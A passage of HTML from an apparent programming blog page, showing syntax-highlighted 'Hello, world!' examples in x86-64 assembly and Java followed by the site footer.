style="--0:#E1E4E8;--1:#24292E">, %</span><span style="--0:#79B8FF;--1:#005CC5">rdi</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">lea</span><span style="--0:#E1E4E8;--1:#24292E"> msg(%</span><span style="--0:#79B8FF;--1:#005CC5">rip</span><span style="--0:#E1E4E8;--1:#24292E">), %</span><span style="--0:#79B8FF;--1:#005CC5">rsi</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">mov</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#79B8FF;--1:#005CC5">$14</span><span style="--0:#E1E4E8;--1:#24292E">, %</span><span style="--0:#79B8FF;--1:#005CC5">rdx</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">syscall</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code=".section .datamsg: .asciz &#x22;Hello, world!\n&#x22;.section .text.global _start_start:    mov $1, %rax    mov $1, %rdi    lea msg(%rip), %rsi    mov $14, %rdx    syscall"><div></div></button></div></figure></div>
+<div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="java"><code><div class="ec-line"><div class="code"><span style="--0:#F97583;--1:#BF3441">public</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">class</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">HelloWorld</span><span style="--0:#E1E4E8;--1:#24292E"> {</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#F97583;--1:#BF3441">public</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">static</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#F97583;--1:#BF3441">void</span><span style="--0:#E1E4E8;--1:#24292E"> </span><span style="--0:#B392F0;--1:#6F42C1">main</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#F97583;--1:#BF3441">String</span><span style="--0:#E1E4E8;--1:#24292E">[] </span><span style="--0:#FFAB70;--1:#AE4B07">args</span><span style="--0:#E1E4E8;--1:#24292E">) {</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">        </span></span><span style="--0:#E1E4E8;--1:#24292E">System.out.</span><span style="--0:#B392F0;--1:#6F42C1">println</span><span style="--0:#E1E4E8;--1:#24292E">(</span><span style="--0:#9ECBFF;--1:#032F62">"Hello, world!"</span><span style="--0:#E1E4E8;--1:#24292E">);</span></div></div><div class="ec-line"><div class="code"><span class="indent"><span style="--0:#E1E4E8;--1:#24292E">    </span></span><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#E1E4E8;--1:#24292E">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="public class HelloWorld {    public static void main(String[] args) {        System.out.println(&#x22;Hello, world!&#x22;);    }}"><div></div></button></div></figure></div>  </div> </article> </main> <footer data-astro-cid-sz7xmlte> <div class="footer-content" data-astro-cid-sz7xmlte> <div class="copyright" data-astro-cid-sz7xmlte>
+&copy; 2025 Obsidian Blogger. All rights reserved.
+</div> </div> </footer>  <script type="module" src="/blogs/_astro/BlogPost.astro_astro_type_script_index_0_lang.irQ3TLua.js"></script> </body> </html>
